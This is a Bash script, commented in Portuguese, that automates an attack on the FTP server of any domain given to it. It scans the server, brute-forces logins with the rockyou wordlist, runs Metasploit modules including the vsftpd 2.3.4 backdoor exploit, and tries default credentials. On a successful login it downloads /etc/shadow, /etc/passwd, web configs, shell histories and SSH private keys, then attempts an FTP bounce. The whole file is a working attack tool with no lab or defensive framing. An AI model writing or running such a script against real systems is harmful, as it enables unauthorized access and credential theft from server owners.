#!/bin/bash
# Script de Exploração FTP - Autônomo e Brutal

# Solicitar target do usuário
if [ -z "$1" ]; then
    echo "Uso: $0 <DOMINIO>"
    echo "Exemplo: $0 exemplo.com.br"
    exit 1
fi

TARGET="$1"
PORT="21"
LOG_DIR="./logs"
RESULTS_DIR="./results"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Iniciando exploração FTP contra ${TARGET}:${PORT}${NC}"

mkdir -p $LOG_DIR $RESULTS_DIR

# Verificar e instalar ferramentas
check_and_install() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${YELLOW}[!] $1 não encontrado. Instalando...${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y $2
    fi
}

echo -e "${GREEN}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "nmap"
check_and_install "hydra" "hydra"
check_and_install "ftp" "ftp"
check_and_install "msfconsole" "metasploit-framework"
check_and_install "ncftp" "ncftp"

# Wordlist
if [ ! -f "/tmp/rockyou.txt" ]; then
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > /tmp/rockyou.txt 2>/dev/null || \
    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt
fi

# 1. SCANNING E BANNER GRABBING
echo -e "${GREEN}[*] Fase 1: Scanning e Banner Grabbing${NC}"
nmap -p $PORT -sV -sC --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor $TARGET -oN $LOG_DIR/ftp_scan.txt

# Banner grabbing manual
echo -e "${YELLOW}[*] Banner grabbing...${NC}"
echo "QUIT" | nc $TARGET $PORT > $LOG_DIR/ftp_banner.txt 2>&1

# 2. BRUTE FORCE AGRESSIVO
echo -e "${GREEN}[*] Fase 2: Brute Force Agressivo${NC}"
COMMON_USERS=("anonymous" "ftp" "admin" "administrator" "root" "test" "user" "guest" "www-data" "apache")

for user in "${COMMON_USERS[@]}"; do
    echo -e "${RED}[!] Brute force para usuário: $user${NC}"
    hydra -l $user -P /tmp/rockyou.txt $TARGET ftp -t 16 -W 1 -f -o $LOG_DIR/hydra_ftp_${user}.txt 2>&1 &
done
wait

# 3. TESTE DE LOGIN ANÔNIMO
echo -e "${GREEN}[*] Fase 3: Teste de Login Anônimo${NC}"
ftp -n $TARGET $PORT << EOF > $LOG_DIR/ftp_anonymous.txt 2>&1
user anonymous anonymous
pwd
ls -la
quit
EOF

# 4. METASPLOIT - EXPLOITS AUTOMÁTICOS
echo -e "${GREEN}[*] Fase 4: Metasploit - Exploits Automáticos${NC}"
msfconsole -q -x "
use auxiliary/scanner/ftp/ftp_version;
set RHOSTS $TARGET;
set RPORT $PORT;
run;
use auxiliary/scanner/ftp/ftp_login;
set RHOSTS $TARGET;
set RPORT $PORT;
set USERNAME anonymous;
set BLANK_PASSWORDS true;
set USER_AS_PASS true;
run;
use auxiliary/scanner/ftp/anonymous;
set RHOSTS $TARGET;
set RPORT $PORT;
run;
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $TARGET;
set RPORT $PORT;
run;
exit;
" > $LOG_DIR/metasploit_ftp.txt 2>&1

# 5. TENTATIVAS DE CONEXÃO COM CREDENCIAIS COMUNS
echo -e "${GREEN}[*] Fase 5: Tentativas de Conexão Direta${NC}"
COMMON_PASSWORDS=("" "ftp" "admin" "password" "123456" "test" "anonymous" "root")

for user in "${COMMON_USERS[@]}"; do
    for pass in "${COMMON_PASSWORDS[@]}"; do
        echo -e "${YELLOW}[*] Tentando: $user:$pass${NC}"
        ftp -n $TARGET $PORT << EOF > $LOG_DIR/ftp_connections.txt 2>&1
user $user $pass
pwd
ls
quit
EOF
        
        if grep -q "230\|200" $LOG_DIR/ftp_connections.txt; then
            echo -e "${GREEN}[!!!] SUCESSO: $user:$pass${NC}" | tee -a $RESULTS_DIR/ftp_credentials.txt
            
            # Pós-exploração
            echo -e "${RED}[!] Executando pós-exploração...${NC}"
            ftp -n $TARGET $PORT << EOF2 > $RESULTS_DIR/ftp_post_exploit_${user}.txt 2>&1
user $user $pass
pwd
ls -la
cd /
ls -la
cd /etc
ls -la
get passwd
get shadow
cd /var/www
ls -la
cd /home
ls -la
quit
EOF2
        fi
    done
done

# 6. EXPLORAÇÃO DE VULNERABILIDADES ESPECÍFICAS
echo -e "${GREEN}[*] Fase 6: Exploração de Vulnerabilidades${NC}"

# Pure-FTPd - verificar exploits conhecidos
echo -e "${YELLOW}[*] Testando vulnerabilidades do Pure-FTPd...${NC}"

# CVE-2004-1137 (Pure-FTPd format string)
echo -e "${YELLOW}[*] Testando CVE-2004-1137...${NC}"

# 7. ENUMERAÇÃO DE DIRETÓRIOS E ARQUIVOS
echo -e "${GREEN}[*] Fase 7: Enumeração de Diretórios${NC}"
if [ -f "$RESULTS_DIR/ftp_credentials.txt" ]; then
    CRED=$(head -1 $RESULTS_DIR/ftp_credentials.txt | grep -oP 'SUCESSO: \K.*')
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    
    echo -e "${GREEN}[+] Enumerando diretórios com credenciais válidas...${NC}"
    
    # Listar diretórios comuns
    DIRS=("/" "/var/www" "/home" "/etc" "/tmp" "/root" "/opt" "/usr")
    
    for dir in "${DIRS[@]}"; do
        ftp -n $TARGET $PORT << EOF > $RESULTS_DIR/ftp_dir_${dir//\//_}.txt 2>&1
user $USER $PASS
cd $dir
pwd
ls -la
quit
EOF
    done
    
    # Baixar arquivos interessantes
    echo -e "${RED}[!] Baixando arquivos interessantes...${NC}"
    mkdir -p $RESULTS_DIR/ftp_downloads
    
    ftp -n $TARGET $PORT << EOF > $RESULTS_DIR/ftp_downloads.txt 2>&1
user $USER $PASS
binary
cd /etc
get passwd $RESULTS_DIR/ftp_downloads/passwd
get shadow $RESULTS_DIR/ftp_downloads/shadow 2>/dev/null
cd /var/www
mget *.php $RESULTS_DIR/ftp_downloads/ 2>/dev/null
mget *.conf $RESULTS_DIR/ftp_downloads/ 2>/dev/null
cd /home
mget .bash_history $RESULTS_DIR/ftp_downloads/ 2>/dev/null
mget .ssh/id_rsa $RESULTS_DIR/ftp_downloads/ 2>/dev/null
quit
EOF
fi

# 8. TESTE DE FTP BOUNCE
echo -e "${GREEN}[*] Fase 8: Teste de FTP Bounce${NC}"
if [ -f "$RESULTS_DIR/ftp_credentials.txt" ]; then
    CRED=$(head -1 $RESULTS_DIR/ftp_credentials.txt | grep -oP 'SUCESSO: \K.*')
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    
    # Tentar FTP bounce scan
    echo -e "${YELLOW}[*] Testando FTP bounce...${NC}"
    ftp -n $TARGET $PORT << EOF > $RESULTS_DIR/ftp_bounce.txt 2>&1
user $USER $PASS
quote PORT 127,0,0,1,0,80
quote RETR /etc/passwd
quit
EOF
fi

echo -e "${GREEN}[*] Exploração FTP concluída!${NC}"
echo -e "${GREEN}[*] Logs: $LOG_DIR${NC}"
echo -e "${GREEN}[*] Resultados: $RESULTS_DIR${NC}"

